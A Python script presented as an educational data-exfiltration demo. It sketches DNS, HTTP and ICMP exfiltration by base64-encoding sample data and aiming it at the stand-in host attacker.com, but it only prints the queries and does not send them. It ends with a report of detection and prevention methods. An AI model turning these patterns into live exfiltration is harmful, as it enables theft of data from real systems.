#!/usr/bin/env python3
"""
Data Exfiltration Tool
Demonstrates data exfiltration techniques (for educational purposes).
"""

import sys
import base64
import socket
from typing import List

class DataExfiltration:
    def __init__(self):
        self.data = []
    
    def exfiltrate_dns(self, data: str, domain: str = 'attacker.com'):
        """Exfiltrate data via DNS"""
        print(f"[*] Exfiltrating data via DNS to {domain}...")
        
        # Encode data
        encoded = base64.b64encode(data.encode()).decode()
        
        # Split into chunks (DNS labels max 63 chars)
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        
        for i, chunk in enumerate(chunks):
            subdomain = f"{chunk}.{domain}"
            print(f"[*] DNS query: {subdomain}")
            # In real scenario, would perform DNS lookup
        
        return len(chunks)
    
    def exfiltrate_http(self, data: str, url: str):
        """Exfiltrate data via HTTP"""
        print(f"[*] Exfiltrating data via HTTP to {url}...")
        
        # Encode data
        encoded = base64.b64encode(data.encode()).decode()
        
        # Send via GET parameter
        # In real scenario, would use requests library
        print(f"[*] HTTP GET: {url}?data={encoded[:50]}...")
        
        return True
    
    def exfiltrate_icmp(self, data: str, target: str):
        """Exfiltrate data via ICMP (ping)"""
        print(f"[*] Exfiltrating data via ICMP to {target}...")
        
        # Encode data
        encoded = base64.b64encode(data.encode()).decode()
        
        # Embed in ICMP payload
        # In real scenario, would craft ICMP packets
        print(f"[*] ICMP packet with payload: {encoded[:50]}...")
        
        return True
    
    def generate_report(self) -> str:
        """Generate data exfiltration report"""
        report = "# Data Exfiltration Techniques Report\n\n"
        report += "## Techniques Demonstrated\n\n"
        report += "1. **DNS Exfiltration**: Data encoded in DNS queries\n"
        report += "2. **HTTP Exfiltration**: Data sent via HTTP requests\n"
        report += "3. **ICMP Exfiltration**: Data embedded in ICMP packets\n\n"
        
        report += "## Detection Methods\n\n"
        report += "1. Monitor DNS queries for unusual patterns\n"
        report += "2. Analyze HTTP traffic for data exfiltration\n"
        report += "3. Monitor ICMP traffic volume\n"
        report += "4. Use DLP (Data Loss Prevention) solutions\n\n"
        
        report += "## Prevention\n\n"
        report += "1. Implement network monitoring\n"
        report += "2. Use egress filtering\n"
        report += "3. Encrypt sensitive data at rest\n"
        report += "4. Implement data classification\n"
        report += "5. Monitor for unusual network activity\n\n"
        
        report += "⚠️ **WARNING**: This tool is for educational purposes only!\n"
        report += "Unauthorized data exfiltration is illegal.\n"
        
        return report

def main():
    print("Data Exfiltration Tool (Educational Purpose Only)")
    print("⚠️ WARNING: Only use on systems you own or have permission to test!")
    
    exfil = DataExfiltration()
    
    # Example usage
    test_data = "Sensitive data example"
    exfil.exfiltrate_dns(test_data)
    exfil.exfiltrate_http(test_data, "http://attacker.com/exfil")
    exfil.exfiltrate_icmp(test_data, "192.168.1.100")
    
    report = exfil.generate_report()
    
    filename = "data_exfiltration_report.md"
    with open(filename, 'w') as f:
        f.write(report)
    
    print(f"\n[+] Report saved to {filename}")

if __name__ == '__main__':
    main()

